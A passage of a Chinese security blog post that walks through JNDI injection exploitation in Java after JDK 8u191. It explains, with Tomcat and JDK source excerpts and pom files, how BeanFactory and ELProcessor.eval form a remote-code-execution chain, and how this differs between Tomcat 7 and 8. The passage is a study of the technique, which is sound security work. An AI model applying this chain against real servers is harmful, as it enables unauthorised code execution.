<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Page 3 | 雨了个雨&#39;s blog</title>

  
  <meta name="author" content="雨了个雨">
  

  
  <meta name="description" content="Focus On Web Security">
  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">雨了个雨&#39;s blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/friends">Friends</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2019/01/11/Exploitng-JNDI-Injection-In-Java/"><span>Exploitng JNDI Injection In Java</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/01/11/Exploitng-JNDI-Injection-In-Java/" rel="bookmark">
        <time class="entry-date published" datetime="2019-01-11T04:03:04.000Z">
          2019-01-11
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a><br>跟着这文章调了一遍, 之前一度以为在jdk 8u191之后, JNDI注入也就只能打打反序列了,看了这文章后发现了一种新的场景。<br>之前JNDI注入都是依靠于getObjectFactoryFromReference时,<br>如果目标classpath里找不到指定的class时,会从远程codebase中下载class字节码, 然后实例化。<br>在出现了trustCodebaseURL的限制之后 已经不再能够从codebase中下载字节码。 但是可以loadClass目标classpath下存在的类。</p>
<h2 id="Tomcat-8"><a href="#Tomcat-8" class="headerlink" title="Tomcat 8"></a>Tomcat 8</h2><p>依赖包pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>JNDIClient.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">&quot;rmi://localhost:1097/Object&quot;</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该方法对RMI registry发请求,反序列获取到ReferenceWrapper_Stub<br>然后把反序列得到的ReferenceWrapper_Stub传给decodeObject</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        Reference var8 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            var8 = (Reference)var3;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在decodeObject中, 给获取到的ReferenceWrapper_Stub调用getReference方法, getReference方法通过获取ReferenceWrapper_Stub的ref属性然后发请求, 反序列请求结果得到真正绑定到RMI Registry上的对象(ResourceRef), 然后传给NamingManager.getObjectInstance方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                      Hashtable&lt;?,?&gt; environment)</span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">.......................</span><br><span class="line">        Reference ref = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        ref = (Reference) refInfo;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String f = ref.getFactoryClassName();</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                 environment);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>


<p>首先类型转换将object转换为Reference对象， 然后ref.getFactoryClassName() 获取FactoryClassName</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getFactoryClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String factory = <span class="keyword">super</span>.getFactoryClassName();</span><br><span class="line">    <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> factory;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        factory = System.getProperty(<span class="string">&quot;java.naming.factory.object&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> factory != <span class="keyword">null</span> ? <span class="keyword">null</span> : <span class="keyword">this</span>.getDefaultFactoryClassName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getFactoryClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> classFactory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回的是Reference对象的classFactory属性。<br>获取到之后又传递给了getObjectFactoryFromReference方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">    InstantiationException,</span></span><br><span class="line"><span class="function">    MalformedURLException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后loadClass, 再newInstance实例化该类。<br>因为newInstance必然只会调用无参构造方法,所以该class需要有定义一个无参的构造方法或者是根本无构造方法(在无任何构造方法的情况下会隐式生成一个无参构造方法), 如果没有无参构造方法newInstance就直接出错了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line"><span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                     environment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在实例化该类后 还会调用这对象的getObjectInstance方法,<br>所以如果能在一些常用的库中找到有getObjectInstance方法 并且在该方法中有做一些危险的事情的话, 那么就有用了。</p>
<p>原文大佬找到了org.apache.naming.factory.BeanFactory类,实现了ObjectFactory接口。<br>那么必然实现了ObjectFactory接口的getObjectInstance方法,</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Reference ref = (Reference)obj;</span><br><span class="line">                String beanClassName = ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="keyword">null</span>;</span><br><span class="line">                ClassLoader tcl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var26) &#123;</span><br><span class="line">                        ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = Class.forName(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var25) &#123;</span><br><span class="line">                        var25.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (beanClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> NamingException(<span class="string">&quot;Class not found: &quot;</span> + beanClassName);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    BeanInfo bi = Introspector.getBeanInfo(beanClass);</span><br><span class="line">                    PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line">                    Object bean = beanClass.getConstructor().newInstance();</span><br><span class="line">                    RefAddr ra = ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">                    Map&lt;String, Method&gt; forced = <span class="keyword">new</span> HashMap();</span><br><span class="line">                    String value;</span><br><span class="line">                    String propName;</span><br><span class="line">                    <span class="keyword">int</span> i;</span><br><span class="line">                    <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        value = (String)ra.getContent();</span><br><span class="line">                        Class&lt;?&gt;[] paramTypes = <span class="keyword">new</span> Class[]&#123;String.class&#125;;</span><br><span class="line">                        String[] var18 = value.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                        i = var18.length;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> var20 = <span class="number">0</span>; var20 &lt; i; ++var20) &#123;</span><br><span class="line">                            String param = var18[var20];</span><br><span class="line">                            param = param.trim();</span><br><span class="line">                            <span class="keyword">int</span> index = param.indexOf(<span class="number">61</span>);</span><br><span class="line">                            <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                propName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">                                param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                propName = <span class="string">&quot;set&quot;</span> + param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + param.substring(<span class="number">1</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                forced.put(param, beanClass.getMethod(propName, paramTypes));</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (SecurityException | NoSuchMethodException var24) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> NamingException(<span class="string">&quot;Forced String setter &quot;</span> + propName + <span class="string">&quot; not found for property &quot;</span> + param);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<p>在该方法中 可以明显的看到反射过程。<br>并且反射的类等东西都来自Reference对象。<br>反射的类来自ref.getClassName()<br>反射调用的方法 来自ref.get(“forceString”),如果forceString属性值中含有=号, 那么=号右边的值就为获取的方法, 左边值为hashmap的key, 如果属性值中没有等号就会获取该属性值的setter方法。</p>
<p>最后获取到一个StringRefAddr对象, 且该对象的addrtype属性值非factory,scope,auth,forceString,singleton时, 获取该对象的addrtype作为hashmap的key 从hashmap中取出之前存入的方法,<br>并且将该对象的contents属性作为反射调用方法时的值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt;[] paramTypes = <span class="keyword">new</span> Class[]&#123;String.class&#125;;</span><br><span class="line">beanClass.getMethod(propName, paramTypes)</span><br></pre></td></tr></table></figure>
<p>并且获取方法的时候,指定了该方法只能有一个String参数。</p>
<p>原文大佬在这里反射的是javax.el.ELProcessor类, 调用eval方法进行el注入 实现RCE.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">eval</span><span class="params">(String expression)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getValue(expression, Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej1.jpg" alt="-w1328"></p>
<h2 id="TOMCAT-7"><a href="#TOMCAT-7" class="headerlink" title="TOMCAT 7"></a>TOMCAT 7</h2><p>TOMCAT 7测试。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.91<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej2.jpg" alt="-w970"><br>出异常, 没有javax.el.ELProcessor这个类。</p>
<p>在TOMCAT&gt;8.5版本中, 存在el包<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej3.jpg" alt="-w338"></p>
<p>在tomcat7中没有这个el包。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej4.jpg" alt="-w388"></p>
<p>在tomcat8中, 依赖了tomcat-jsp-api包<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej5.jpg" alt="-w884"><br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej6.jpg" alt="-w360"><br>jsp-api包又依赖了el包。</p>
<p>在tomcat7中,<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej7.jpg" alt="-w690"><br>并没有依赖tomcat-jsp-api, 就没有了el包。<br>所以在tomcat7中 还需要再手动引入这个包。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej8.jpg" alt="-w920"></p>
<h2 id="tomcat-el包和-javax-el包同时存在时"><a href="#tomcat-el包和-javax-el包同时存在时" class="headerlink" title="tomcat el包和 javax.el包同时存在时"></a>tomcat el包和 javax.el包同时存在时</h2><p>tomcat的el包名和javax.el的包名相同, 都为javax.el<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ej9.jpg" alt="-w761"><br>存在两个javax.el.ELProcessor<br>在import这个类的时候, 具体引入的哪个类跟编译器先载入哪个jar包有关。<br>maven中, 哪个dependency在前就会导入哪个类。<br>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.el/javax.el-api --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.el-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1-b06<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.sun.el/el-ri --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>el-ri<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span 